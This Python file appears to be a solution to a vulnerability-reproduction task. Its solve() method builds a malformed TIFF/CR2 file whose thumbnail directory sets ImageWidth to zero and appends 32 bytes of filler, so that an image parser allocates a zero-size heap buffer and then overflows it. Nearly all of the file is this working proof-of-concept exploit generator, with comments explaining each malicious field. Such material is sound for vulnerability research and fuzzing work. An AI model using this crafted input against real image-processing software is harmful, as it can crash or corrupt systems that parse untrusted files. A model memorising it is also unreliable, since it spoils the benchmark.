import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow
        in a TIFF/CR2 image parser.

        The vulnerability is triggered by an image with a width or height of zero.
        This PoC constructs a minimal TIFF file with a thumbnail sub-directory (IFD)
        that has its ImageWidth tag set to 0. When the parser tries to allocate
        memory for this thumbnail, it calculates a size of 0 bytes but then
        proceeds to copy thumbnail data into this buffer, causing an overflow.
        """

        def create_entry(tag: int, type: int, count: int, value: int) -> bytes:
            # TIFF directory entries are 12 bytes long, little-endian.
            # <H (Tag), H (Type), I (Count), I (Value/Offset)
            return struct.pack('<HHII', tag, type, count, value)

        # TIFF/Exif constants
        TIFF_TYPE_SHORT = 3
        TIFF_TYPE_LONG = 4

        TAG_ImageWidth = 0x0100
        TAG_ImageLength = 0x0101
        TAG_Compression = 0x0103
        TAG_SubIFDs = 0x014a
        TAG_JPEGInterchangeFormat = 0x0201
        TAG_JPEGInterchangeFormatLength = 0x0202

        poc_parts = []

        # 1. TIFF Header (8 bytes)
        # 'II' for little-endian, 42 as magic number, followed by offset to the first IFD.
        offset_ifd0 = 8
        header = b'II\x2a\x00' + struct.pack('<I', offset_ifd0)
        poc_parts.append(header)

        # 2. IFD0 (Main Image File Directory)
        # This IFD contains a single entry, a SubIFDs tag, pointing to the thumbnail IFD.
        num_ifd0_entries = 1
        # The next block (IFD1) will be placed right after this one.
        # IFD size = 2 (entry count) + N*12 (entries) + 4 (next IFD offset)
        offset_ifd1 = offset_ifd0 + 2 + (num_ifd0_entries * 12) + 4
        
        ifd0_entry = create_entry(TAG_SubIFDs, TIFF_TYPE_LONG, 1, offset_ifd1)
        ifd0 = struct.pack('<H', num_ifd0_entries) + ifd0_entry + struct.pack('<I', 0) # 0 for next IFD offset
        poc_parts.append(ifd0)

        # 3. IFD1 (Thumbnail Image File Directory)
        # This is the malicious IFD that will trigger the vulnerability.
        num_ifd1_entries = 5
        
        # The dummy JPEG data will be placed right after this IFD.
        len_jpeg_data = 32
        offset_jpeg_data = offset_ifd1 + 2 + (num_ifd1_entries * 12) + 4

        ifd1_entries = [
            # Entry 1: ImageWidth = 0. This is the core of the vulnerability.
            create_entry(TAG_ImageWidth, TIFF_TYPE_SHORT, 1, 0),
            # Entry 2: ImageLength = 10 (a non-zero value).
            create_entry(TAG_ImageLength, TIFF_TYPE_SHORT, 1, 10),
            # Entry 3: Compression = 6 (JPEG). This directs the parser to use the thumbnail logic.
            create_entry(TAG_Compression, TIFF_TYPE_SHORT, 1, 6),
            # Entry 4: JPEGInterchangeFormat points to the location of the thumbnail data.
            create_entry(TAG_JPEGInterchangeFormat, TIFF_TYPE_LONG, 1, offset_jpeg_data),
            # Entry 5: JPEGInterchangeFormatLength specifies the size of the thumbnail data.
            create_entry(TAG_JPEGInterchangeFormatLength, TIFF_TYPE_LONG, 1, len_jpeg_data)
        ]

        ifd1 = struct.pack('<H', num_ifd1_entries) + b''.join(ifd1_entries) + struct.pack('<I', 0)
        poc_parts.append(ifd1)

        # 4. Dummy JPEG Data
        # This is the data that will be written out of bounds.
        jpeg_data = b'A' * len_jpeg_data
        poc_parts.append(jpeg_data)

        # Concatenate all parts to form the final PoC file.
        return b''.join(poc_parts)